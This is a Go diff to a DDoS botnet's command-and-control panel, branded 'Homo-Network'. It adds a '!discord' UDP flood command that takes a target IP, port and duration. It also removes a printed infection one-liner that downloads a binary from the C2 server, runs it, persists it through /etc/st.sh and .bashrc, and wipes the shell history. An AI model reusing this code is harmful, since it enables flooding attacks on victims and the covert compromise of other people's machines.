@@ -102,6 +102,24 @@ func CommandManager(conn net.Conn) {
 
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "udpmix", cmd[1], cmd[2])
 
+	} else if strings.HasPrefix(string(line), "!discord") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!discord <TARGET> <PORT> <DURATION>\n\r", "!discord 1.1.1.1 1093 60\r\n", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!discord <TARGET> <PORT> <DURATION>\n\r", "!discord 1.1.1.1 1093 60\r\n", conn)
+		}
+
+		go server.Discord(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "discord", cmd[1], cmd[2])
+
 	} else if strings.HasPrefix(string(line), "!sshkill") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
@@ -173,14 +191,8 @@ func CommandManager(conn net.Conn) {
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "tcpmix", cmd[1], cmd[2])
 
 	} else if strings.HasPrefix(string(line), "payload") {
-		var host string
-		if !config.GetConfig().Api.CustomPathEnabled {
-			host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
-		} else {
-			host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
-		}
-
-		Print("apt install curl -y; ulimit -n 999999; rm /bin/sysmonit.bin; curl -X POST http://"+host+" -o /bin/sysmonit.bin ; chmod +x /bin/sysmonit.bin ; /bin/sysmonit.bin & disown >> /etc/st.sh ; bash /etc/st.sh >> ~/.bashrc; bash /etc/st.sh ; rm ~/.bash_history\n\r", conn)
+		payload := server.GeneratePayload()
+		Print(payload, conn)
 		CommandManager(conn)
 
 	} else if strings.HasPrefix(string(line), "scanner") {
@@ -194,7 +206,7 @@ func CommandManager(conn net.Conn) {
 
 		if len(AttacksMap) < 1 {
 			Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("No active attacks\n"), conn)
-			return
+			CommandManager(conn)
 		}
 
 		tab := strings.Builder{}
@@ -215,7 +227,7 @@ func CommandManager(conn net.Conn) {
 		w.Flush()
 		Print(tab.String(), conn)
 
-	} else if strings.HasPrefix(string(line), "help") {
+	} else if strings.HasPrefix(string(line), "help") || strings.HasPrefix(string(line), "?") {
 
 		conn.Write([]byte("\n"))
 
@@ -248,6 +260,7 @@ func CommandManager(conn net.Conn) {
 		conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!raknet: Raknet method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!sshkill: Ssh method\t\t\t| Type: L4\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!discord: Udp method for discord calls\t| Type: L4\n\r")))
 
 		conn.Write([]byte("\n"))
 
